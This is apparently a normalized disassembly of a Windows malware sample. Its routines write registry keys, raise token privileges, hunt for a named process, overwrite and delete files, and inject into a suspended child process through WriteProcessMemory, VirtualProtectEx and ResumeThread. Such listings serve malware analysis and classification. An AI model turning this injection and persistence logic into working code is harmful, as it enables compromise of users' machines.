sub_401000
sub esp 0x108
lea eax [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0x110 ]
push ebp
push esi
push edi
push ebx
push rw-data
push eax
call sprintf
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
push rw-data
push 0x80000002
[ edi ] [ esi ]
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
[ edi ]
not ecx
mov edx [ esp + 0x10 ]
dec ecx
push ecx
lea ecx [ esp + 0x18 ]
push ecx
push 0x1
push eax
push ebx
push edx
call [ RegSetValueExA@IAT ]
sub_4010b0
sub esp 0x54
push ebx
push esi
push edi
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x1c ]
mov ebx [ PathFileExistsA@IAT ]
[ edi ]
mov edi [ esp + 0x64 ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] eax
push edi
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] 0x44
mov [ esp + 0x1c ] eax
mov [ esp + 0x4c ] 0x81
mov [ esp + 0x50 ] ax
call ebx
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x54
retn
mov esi [ esp + 0x68 ]
push esi
call ebx
test eax eax
je r-xdata
push 0x0
lea ecx [ esp + 0x10 ]
push esi
lea edx [ esp + 0x24 ]
push ecx
push edx
push 0x0
push 0x0
push 0x8000000
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call sub_401e9a
test eax eax
jne r-xdata
push 0x2
call [ ExitProcess@IAT ]
sub_401140
sub esp 0x12c
push ebx
push ebp
mov ebp [ PathFileExistsA@IAT ]
push esi
push edi
push rw-data
mov [ esp + 0x28 ] rw-data
mov [ esp + 0x2c ] rw-data
mov [ esp + 0x30 ] rw-data
mov [ esp + 0x34 ] rw-data
mov [ esp + 0x38 ] rw-data
mov [ esp + 0x14 ] rw-data
mov [ esp + 0x18 ] rw-data
mov [ esp + 0x1c ] rw-data
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x24 ] rw-data
call ebp
test eax eax
lea ebx [ esp + 0x24 ]
jne r-xdata
xor esi esi
mov edi ebx
lea ebx [ esp + 0x10 ]
push rw-data
push rw-data
lea ecx [ esp + 0x40 ]
push rw-data
push ecx
call sprintf
mov eax [ ebx + esi * 4 ]
lea edx [ esp + 0x48 ]
push edx
push eax
call sub_4010b0
add esp 0x18
mov esi 0x4
lea edi [ ebx + 0x10 ]
inc esi
add edi 0x4
cmp esi 0x5
jl r-xdata
push rw-data
push rw-data
lea edx [ esp + 0x40 ]
push rw-data
push edx
call sprintf
mov ecx [ ebx + esi * 4 ]
lea eax [ esp + 0x48 ]
push eax
push ecx
call sub_4010b0
add esp 0x18
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn
dec esi
sub edi 0x4
test esi esi
jge r-xdata
mov eax [ edi ]
push eax
call ebp
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn
mov ecx [ edi ]
push ecx
call ebp
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn
sub_401260
sub esp 0x2c
mov ecx [ esp + 0x34 ]
push ebx
push esi
lea eax [ esp + 0xc ]
push edi
push eax
push ecx
push 0x0
mov [ esp + 0x18 ] 0x10
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov esi [ esp + 0x3c ]
mov edi [ AdjustTokenPrivileges@IAT ]
mov [ esp + 0x2c ] edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x18 ]
mov [ esp + 0x30 ] eax
push ecx
push edx
lea eax [ esp + 0x30 ]
push 0x10
push eax
push 0x0
push esi
mov [ esp + 0x40 ] 0x1
mov [ esp + 0x4c ] 0x0
call edi
mov ebx [ GetLastError@IAT ]
call ebx
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x44 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ esp + 0x18 ] 0x1
test eax eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] edx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x2c
retn
and al 0xfd
or al 0x2
jmp r-xdata
mov [ esp + 0x24 ] eax
mov eax [ esp + 0xc ]
push 0x0
push 0x0
lea ecx [ esp + 0x20 ]
push eax
push ecx
push 0x0
push esi
call edi
call ebx
neg eax
sbb eax eax
pop edi
pop esi
inc eax
pop ebx
add esp 0x2c
retn
sub_401330
push ecx
call sub_4014c0
test eax eax
je r-xdata
call sub_401390
call sub_401430
mov eax 0x1
pop ecx
retn
lea eax [ esp ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov ecx [ esp ]
push 0x1
push rw-data
push ecx
call sub_401260
mov edx [ esp + 0xc ]
add esp 0xc
push edx
call [ CloseHandle@IAT ]
sub_401390
sub esp 0x104
lea eax [ esp ]
push esi
push rw-data
push rw-data
push rw-data
push eax
call sprintf
mov esi [ PathFileExistsA@IAT ]
add esp 0x10
push rw-data
call esi
test eax eax
je r-xdata
push rw-data
call esi
test eax eax
je r-xdata
push rw-data
call sub_401000
lea ecx [ esp + 0x8 ]
push ecx
push rw-data
jmp r-xdata
push rw-data
call esi
test eax eax
je r-xdata
push rw-data
call sub_401000
lea edx [ esp + 0x8 ]
push edx
push rw-data
jmp r-xdata
call sub_4010b0
add esp 0xc
mov eax 0x1
pop esi
add esp 0x104
retn
push rw-data
call sub_401000
lea eax [ esp + 0x8 ]
push eax
push rw-data
sub_401430
sub esp 0x104
lea eax [ esp ]
push esi
push rw-data
push rw-data
push rw-data
push eax
call sprintf
mov esi [ PathFileExistsA@IAT ]
add esp 0x10
push rw-data
call esi
test eax eax
je r-xdata
push rw-data
call esi
test eax eax
je r-xdata
lea ecx [ esp + 0x4 ]
push ecx
push rw-data
jmp r-xdata
push rw-data
call esi
test eax eax
je r-xdata
lea edx [ esp + 0x4 ]
push edx
push rw-data
jmp r-xdata
call sub_4010b0
add esp 0x8
mov eax 0x1
pop esi
add esp 0x104
retn
lea eax [ esp + 0x4 ]
push eax
push rw-data
sub_4014f0
sub esp 0x10
mov al 0x1
mov cl 0x10
mov [ esp ] al
mov [ esp + 0x1 ] al
mov al 0x4
mov [ esp + 0x3 ] cl
mov [ esp + 0x4 ] al
mov [ esp + 0x5 ] al
mov al 0x8
mov [ esp + 0x8 ] cl
mov [ esp + 0x6 ] al
mov [ esp + 0x7 ] al
mov al 0x40
push esi
mov esi [ esp + 0x18 ]
mov [ esp + 0xf ] al
mov [ esp + 0x10 ] al
mov cl 0x20
mov al 0x80
push edi
mov [ esp + 0x12 ] cl
mov [ esp + 0x15 ] cl
mov [ esp + 0x16 ] al
mov [ esp + 0x17 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
mov dl 0x2
[ edi ]
not ecx
dec ecx
xor edi edi
test ecx ecx
mov [ esp + 0xa ] dl
mov [ esp + 0x11 ] dl
mov [ esp + 0x1c ] ecx
jle r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffe
cmp [ ecx + esi ] 0x20
jne r-xdata
push ebx
push ebp
mov [ ecx + esi + 0x1 ] 0x0
pop edi
pop esi
add esp 0x10
retn
xor eax eax
not bl
and dl bl
or dl bl
jmp r-xdata
mov [ ecx + esi + 0x1 ] al
pop edi
pop esi
add esp 0x10
retn
mov dl [ ecx + esi - 0x1 ]
dec ecx
cmp dl 0x20
je r-xdata
test [ eax - 0x1 ] cl
mov bl [ eax ]
je r-xdata
mov eax [ esp + 0x24 ]
mov [ edi + esi ] dl
inc edi
cmp edi eax
jl r-xdata
add eax 0x2
dec ebp
jne r-xdata
cmp ecx eax
jle r-xdata
mov cl [ edi + esi ]
xor dl dl
lea eax [ esp + 0x11 ]
mov ebp 0x8
pop ebp
pop ebx
sub_4015d0
push ecx
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
mov [ esp + 0x10 ] 0x0
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x8
pop ebx
pop ecx
retn
push 0x80
push edi
call [ SetFileAttributesA@IAT ]
push rw-data
push edi
call fopen
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax 0x7
pop ebx
pop ecx
retn
mov eax [ ebx + 0x10 ]
push eax
call _filelength
push ebx
mov esi eax
call fclose
add esp 0x8
test esi esi
jle r-xdata
push edi
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
pop edi
pop esi
add eax 0x6
pop ebx
pop ecx
retn
push esi
call malloc
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax 0x4
pop ebx
pop ecx
retn
push ebp
push rw-data
push edi
call fopen
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
push rw-data
push edi
call fopen
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov ecx esi
or eax 0xffffffff
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push ebp
and ecx 0x3
push esi
push 0x1
push ebx
[ edi ]
call fwrite
push ebp
call fflush
push ebp
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov [ esp + 0x10 ] 0x1
push rw-data
push edi
call fopen
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov ecx esi
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push ebp
and ecx 0x3
push esi
push 0x1
push ebx
[ edi ]
call fwrite
push ebp
call fflush
push ebp
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov [ esp + 0x10 ] 0x1
mov esi [ esp + 0x10 ]
mov ecx esi
mov eax 0x55555555
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push ebp
and ecx 0x3
push esi
push 0x1
push ebx
[ edi ]
call fwrite
push ebp
call fflush
push ebp
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov esi 0x1
jmp r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
pop ecx
retn
push edi
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
pop edi
pop esi
add eax 0x2
pop ebx
pop ecx
retn
push ebx
call free
add esp 0x4
cmp esi 0x1
pop ebp
jne r-xdata
sub_401790
mov eax 0x1114
call sub_401bc0
push ebx
push ebp
push esi
push edi
push 0x0
call _sleep
add esp 0x4
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x124 ]
push eax
push 0x1000
push ecx
call EnumProcesses
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1114
retn
mov edi [ esp + 0x10 ]
mov [ esp + 0x14 ] 0x0
shr edi 0x2
mov [ esp + 0x1c ] edi
je r-xdata
mov ebp [ esp + 0x1128 ]
lea ebx [ esp + 0x124 ]
mov eax [ esp + 0x14 ]
add ebx 0x4
inc eax
cmp eax edi
mov [ esp + 0x14 ] eax
jb r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push eax
push 0x4
push ecx
push esi
call EnumProcessModules
test eax eax
je r-xdata
push 0x0
call _sleep
mov edx [ ebx ]
add esp 0x4
push edx
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x20 ]
push 0x104
push edx
push eax
push esi
call GetModuleBaseNameA
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x24 ]
push ebp
push ecx
call _strnicmp
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1114
retn
mov edi [ esp + 0x1c ]
sub_4018a0
sub esp 0x224
push 0x104
push rw-data
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x5c
push rw-data
call strrchr
push rw-data
mov [ eax ] 0x0
call sub_4014f0
push rw-data
call sub_4014f0
push rw-data
call sub_4014f0
push rw-data
call sub_4014f0
push rw-data
call sub_4014f0
push rw-data
call sub_4014f0
push rw-data
call sub_4014f0
push rw-data
call sub_401790
add esp 0x28
cmp eax 0x1
jne r-xdata
push rw-data
lea eax [ esp + 0x4 ]
push rw-data
push eax
call sprintf
add esp 0xc
lea ecx [ esp ]
push ecx
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
push rw-data
push rw-data
lea eax [ esp + 0x8 ]
push rw-data
push eax
call sprintf
lea ecx [ esp + 0x10 ]
push ecx
call sub_4015d0
push rw-data
push rw-data
lea edx [ esp + 0x1c ]
push rw-data
push edx
call sprintf
lea eax [ esp + 0x24 ]
push eax
call sub_4015d0
push 0x3e8
call _sleep
push rw-data
push rw-data
lea ecx [ esp + 0x34 ]
push rw-data
push ecx
call sprintf
lea edx [ esp + 0x3c ]
push edx
call sub_4015d0
add esp 0x40
push 0x0
call exit
lea edx [ esp + 0x120 ]
push 0x104
push edx
call [ GetSystemDirectoryA@IAT ]
lea eax [ esp + 0x120 ]
push rw-data
push eax
push rw-data
push rw-data
call sprintf
lea ecx [ esp + 0x130 ]
push rw-data
push ecx
push rw-data
push rw-data
call sprintf
lea edx [ esp + 0x140 ]
push rw-data
push edx
push rw-data
push rw-data
call sprintf
add esp 0x30
call sub_4014c0
test eax eax
je r-xdata
push rw-data
push rw-data
lea edx [ esp + 0x8 ]
push rw-data
push edx
call sprintf
lea eax [ esp + 0x10 ]
push eax
call sub_4015d0
push rw-data
push rw-data
lea ecx [ esp + 0x1c ]
push rw-data
push ecx
call sprintf
lea edx [ esp + 0x24 ]
push edx
call sub_4015d0
push 0x3e8
call _sleep
push rw-data
push rw-data
lea eax [ esp + 0x34 ]
push rw-data
push eax
call sprintf
lea ecx [ esp + 0x3c ]
push ecx
call sub_4015d0
add esp 0x40
push 0x0
call exit
call sub_4014c0
test eax eax
je r-xdata
push ebx
mov ebx [ Sleep@IAT ]
push esi
mov esi [ PostThreadMessageA@IAT ]
push edi
mov edi [ GetCurrentThreadId@IAT ]
mov [ rw-data ] 0x0
push 0x1
push rw-data
call [ InitializeSecurityDescriptor@IAT ]
push 0x0
push 0x0
push 0x1
push rw-data
call [ SetSecurityDescriptorDacl@IAT ]
mov [ rw-data ] rw-data
jmp r-xdata
push 0x0
push 0x0
lea eax [ esp + 0x118 ]
push 0x0
push eax
call [ GetMessageA@IAT ]
pop edi
pop esi
pop ebx
push 0x64
call ebx
jmp r-xdata
call sub_401140
xor eax eax
add esp 0x224
retn 0x10
call sub_401330
xor eax eax
add esp 0x224
retn 0x10
mov [ rw-data ] 0xc
mov [ rw-data ] 0x1
call [ GetVersion@IAT ]
cmp al 0x6
jae r-xdata
push 0x1
call _sleep
add esp 0x4
push 0x0
push 0x0
push 0x0
call edi
push eax
call esi
test eax eax
jne r-xdata
sub_401bc0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401d7b
cmp [ rw-data ] ebx
jne r-xdata
call sub_401d66
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401d78
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4018a0
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401d8c
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
push 0x1c
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call memset
mov esi [ VirtualQueryEx@IAT ]
add esp 0xc
lea ecx [ ebp - 0x1c ]
mov eax 0x10000
push 0x1c
push ecx
push eax
mov edi eax
push [ ebp + 0x8 ]
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x1000
jne r-xdata
pop edi
pop esi
leave
retn
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
push 0x1c
lea edi [ ecx + eax ]
lea eax [ ebp - 0x1c ]
push eax
push edi
push [ ebp + 0x8 ]
jmp r-xdata
test [ ebp - 0x7 ] 0x1
jne r-xdata
call esi
test eax eax
jbe r-xdata
push edi
push [ ebp + 0x8 ]
call sub_401e04
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax edi
sub_401e04
push ebp
mov ebp esp
sub esp 0x138
push ebx
push edi
push 0x40
lea eax [ ebp - 0x40 ]
push 0x0
push eax
call memset
mov ebx [ ebp + 0xc ]
add esp 0xc
mov edi [ ReadProcessMemory@IAT ]
lea eax [ ebp - 0x40 ]
push 0x0
push 0x40
push eax
push ebx
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
cmp [ ebp - 0x40 ] 0x5a4d
jne r-xdata
xor eax eax
jmp r-xdata
push esi
mov esi 0xf8
push esi
lea eax [ ebp - 0x138 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x138 ]
push 0x0
push esi
push eax
mov eax [ ebp - 0x4 ]
add eax ebx
push eax
push [ ebp + 0x8 ]
call edi
test eax eax
pop esi
je r-xdata
pop edi
pop ebx
leave
retn
cmp [ ebp - 0x138 ] 0x4550
jne r-xdata
mov eax [ ebp - 0x122 ]
not ax
movzx eax ax
shr eax 0xd
and eax 0x1
sub_401e9a
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x34 ]
or al 0x4
test ecx ecx
jne r-xdata
lea edx [ ebp - 0x18 ]
push edx
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ecx
test eax eax
je r-xdata
mov ecx [ CreateProcessA@IAT ]
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x30 ]
xor ecx ecx
test eax eax
je r-xdata
leave
retn 0x30
lea eax [ ebp - 0x8 ]
push ecx
push eax
push [ ebp - 0x18 ]
call sub_401f29
add esp 0xc
test eax eax
jne r-xdata
push 0x1
mov [ ebp - 0x8 ] eax
pop ecx
cmp [ ebp + 0x2c ] 0x0
je r-xdata
test [ ebp + 0x1c ] 0x4
jne r-xdata
lea eax [ ebp - 0x18 ]
push 0x10
push eax
push [ ebp + 0x2c ]
call memcpy
add esp 0xc
push 0x1
pop eax
push [ ebp - 0x14 ]
call [ ResumeThread@IAT ]
sub_401f29
push ebp
mov ebp esp
sub esp 0x2d8
push ebx
push esi
mov esi 0x150
push edi
xor ebx ebx
push esi
lea eax [ ebp - 0x2d8 ]
push ebx
push eax
mov [ ebp - 0x28 ] ebx
call memset
push [ ebp + 0x8 ]
mov [ ebp - 0x2d8 ] esi
call sub_401d8c
mov esi eax
push 0x40
lea eax [ ebp - 0x90 ]
push ebx
push eax
mov [ ebp - 0x8 ] esi
call memset
add esp 0x1c
mov edi [ ReadProcessMemory@IAT ]
lea eax [ ebp - 0x90 ]
push ebx
push 0x40
push eax
push esi
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x28 ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x90 ]
push 0x40
push eax
lea eax [ ebp - 0x2c4 ]
push eax
call memcpy
add esp 0xc
cmp [ ebp - 0x90 ] 0x5a4d
mov [ ebp - 0x2d4 ] esi
jne r-xdata
mov esi 0xf8
lea eax [ ebp - 0x188 ]
push esi
push ebx
push eax
call memset
mov ecx [ ebp - 0x8 ]
add esp 0xc
lea eax [ ebp - 0x188 ]
push ebx
push esi
push eax
mov eax [ ebp - 0x54 ]
add eax ecx
push eax
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x188 ]
push esi
push eax
lea eax [ ebp - 0x284 ]
push eax
call memcpy
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x8 ]
add esp 0xc
cmp [ ebp - 0x188 ] 0x4550
lea edx [ eax + ecx ]
mov [ ebp - 0x2d0 ] edx
jne r-xdata
cmp [ ebp - 0x108 ] ebx
je r-xdata
movzx edx [ ebp - 0x174 ]
cmp [ ebp - 0x182 ] bx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xc ] ebx
lea eax [ edx + eax + 0x18 ]
mov [ ebp - 0x4 ] ebx
jbe r-xdata
lea eax [ ebp - 0x188 ]
push eax
push ecx
push [ ebp + 0x8 ]
call sub_4024dc
mov ecx [ ebp - 0x104 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x10 ]
add esp 0xc
mov ebx eax
lea esi [ eax + eax * 4 ]
shl esi 0x2
shl ebx 0x4
lea edi [ ecx + esi + 0x7 ]
and edi 0xfffffff8
add ebx edi
test eax eax
mov [ ebp - 0x14 ] ebx
jbe r-xdata
lea esi [ eax + ecx ]
push [ ebp - 0x14 ]
call ??2@YAPAXI@Z
test eax eax
pop ecx
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0xb0 ] ebx
mov eax [ ebp - 0x40 ]
jne r-xdata
push [ ebp - 0x14 ]
push 0x0
push eax
call memset
mov eax [ ebp - 0x168 ]
mov edx [ ebp - 0x164 ]
mov ecx [ ebp - 0x8 ]
add eax edx
add eax [ ebp - 0x16c ]
add esp 0xc
add eax [ ebp - 0x15c ]
add eax ecx
cmp ecx eax
jae r-xdata
mov eax [ ebp - 0x4 ]
push [ eax ]
call strlen
add [ ebp - 0x4 ] 0x4
add eax 0x4
and al 0xfc
pop ecx
add [ ebp - 0x14 ] eax
dec [ ebp - 0xc ]
jne r-xdata
mov ecx [ ebp - 0x3c ]
add eax ecx
cmp [ ebp - 0xc ] eax
jae r-xdata
mov ecx [ ebp - 0x44 ]
cmp [ ebp - 0x108 ] ecx
jb r-xdata
push [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
call sub_40261c
add esp 0xc
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
mov ecx eax
movzx eax [ ebp - 0x182 ]
inc [ ebp - 0x4 ]
add esi 0x28
cmp [ ebp - 0x4 ] eax
jb r-xdata
mov [ ebp - 0xc ] eax
lea edx [ eax + ecx ]
cmp [ ebp - 0x108 ] edx
jae r-xdata
push [ ebp - 0x4 ]
call ??3@YAXPAX@Z
pop ecx
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x108 ]
push 0x40
and [ ebp - 0x10 ] 0x0
push [ ebp - 0x104 ]
and [ ebp - 0x2c8 ] 0x0
add eax ecx
push eax
push [ ebp + 0x8 ]
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
push 0x28
lea eax [ ebp - 0x50 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x50 ]
push ebx
push 0x28
push eax
push esi
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xb0 ] ecx
mov [ ebp - 0xac ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x2c8 ] eax
mov eax [ ebp - 0x24 ]
sub eax ecx
push 0x0
push [ ebp - 0x104 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
add esi eax
mov eax [ ebp - 0x108 ]
add eax ecx
push esi
push eax
push [ ebp + 0x8 ]
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x1c ] 0x0
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x104 ]
push 0x14
xor edx edx
pop ecx
div ecx
mov ecx [ ebp + 0x10 ]
xor edx edx
xor esi esi
add ecx eax
cmp ecx edx
jbe r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
add ecx edi
lea esi [ eax + 0x4 ]
mov [ ebp - 0x18 ] ecx
lea edi [ edi + eax + 0x4 ]
jmp r-xdata
push edx
push ebx
push [ ebp - 0x4 ]
mov edi [ WriteProcessMemory@IAT ]
push [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
add eax ebx
push [ ecx ]
mov ecx [ ebp - 0x14 ]
sub ecx ebx
push ecx
push eax
call sub_402493
add esp 0xc
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x108 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x104 ] eax
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
inc esi
add eax 0x14
cmp esi ecx
jb r-xdata
cmp [ eax + 0x10 ] edx
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx 0x80000001
mov [ esi - 0x4 ] eax
xor edx edx
add eax 0x8
mov [ edi - 0x4 ] ecx
mov [ edi ] edx
mov [ esi + 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ edi + 0x4 ] ecx
mov [ edi + 0x8 ] edx
mov [ esi ] edx
add eax ebx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
push [ eax ]
call strlen
add eax 0x4
add [ ebp - 0x18 ] 0x10
add [ ebp + 0xc ] 0x4
and al 0xfc
add ebx eax
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
add edi 0x10
add esi 0x14
cmp eax [ ebp + 0x10 ]
pop ecx
jb r-xdata
mov esi [ ebp - 0x8 ]
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ eax ] edx
jne r-xdata
mov eax [ ebp - 0x4 ]
and [ ebp - 0x74 ] 0x0
push 0x0
lea eax [ ebp - 0x90 ]
push 0x40
push eax
push esi
push ebx
call edi
test eax eax
je r-xdata
mov esi [ ebp - 0x8 ]
push 0x0
push 0x14
lea ebx [ eax + esi ]
lea eax [ ebp - 0x3c ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x188 ]
push 0xf8
push eax
mov eax [ ebp - 0x54 ]
add eax esi
push eax
push ebx
call edi
test eax eax
je r-xdata
lea eax [ ebx + 0x10 ]
mov [ ebp - 0x2cc ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x18c ] eax
lea eax [ ebp - 0x10 ]
and [ ebp - 0x2c ] 0xfffffffe
push eax
push 0x4
push 0x14
push ebx
push [ ebp + 0x8 ]
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x188 ]
push eax
push esi
push ebx
call sub_4024dc
push [ ebp - 0x20 ]
push eax
call sub_4024c8
push eax
push [ ebp - 0x74 ]
call sub_4024c8
